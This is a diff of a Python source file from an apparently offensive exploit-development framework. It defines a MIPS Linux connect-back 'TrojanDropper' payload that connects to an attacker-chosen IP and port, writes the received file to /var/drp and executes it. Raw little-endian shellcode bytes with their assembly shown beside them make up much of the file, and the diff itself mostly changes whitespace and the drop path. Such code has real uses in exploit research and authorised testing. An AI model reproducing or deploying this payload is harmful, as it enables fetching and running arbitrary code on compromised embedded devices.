@@ -1,9 +1,10 @@
 # Copyright (c) 2013
 # - Zachary Cutlip <uid000@gmail.com>
+#p.add_string('K'*4)
 # - Tactical Network Solutions, LLC
-# 
+#
 # See LICENSE.txt for more details.
-# 
+#
 import string
 import socket
 import os
@@ -14,12 +15,12 @@ from ...common.support import BigEndian,LittleEndian
 class TrojanDropper:
     """
     This is a MIPS Linux connect-back payload that downloads and execs() a file.
-    
+
     It will establish a TCP connection to the specified port and address, read
-    off the socket to a file called "/tmp/drp", then exec() that file.
+    off the socket to a file called "/var/drp", then exec() that file.
     The file should be served as a raw stream of bytes.  When the server has
     sent the entire file, it should close the connection.
-    
+
     This payload can be used with TrojanServer to serve files to the target.
     Further, stage2dropper.c (in contrib) may be a useful companion trojan.
     """
@@ -81,12 +82,12 @@ class TrojanDropper:
             "\x24\x02\x0f\xab", # li    v0,4011
             "\x01\x01\x01\x0c", # syscall   0x40404
     ], '')
-    
+
     shellcodes[LittleEndian] = string.join([
         "\x61\x72\x0f\x3c", # lui   t7,0x7261    "ra"
         "\x2f\x76\xef\x35", # ori   t7,t7,0x762f "v/"
         "\xf4\xff\xaf\xaf", # sw	t7,-12(sp)
-        "\x72\x70\x0e\x3c", # lui	t6,0x7072    "pr" 
+        "\x72\x70\x0e\x3c", # lui	t6,0x7072    "pr"
         "\x2f\x64\xce\x35", # ori	t6,t6,0x642f "d/"
         "\xf8\xff\xae\xaf", # sw	t6,-8(sp)
         "\xfc\xff\xa0\xaf", # sw	zero,-4(sp)
@@ -144,7 +145,7 @@ class TrojanDropper:
     def __init__(self,connectback_ip,endianness,port=8080):
         """
         Class constructor.
-        
+
         Parameters:
         -----------
         connectback_ip: IP Address to connect back to.
@@ -152,12 +153,12 @@ class TrojanDropper:
                     (imported from bowcaster.common.support).
         port:   Optional parameter specifying TCP port to connect back to.
                 Defaults to 8080.
-                
+
         Attributes:
         -----------
         shellcode:  The string representing the payload's shellcode, ready to add
                     to an exploit buffer.
-        
+
         Notes:
         ------
         Currently only LittleEndian is implemented.
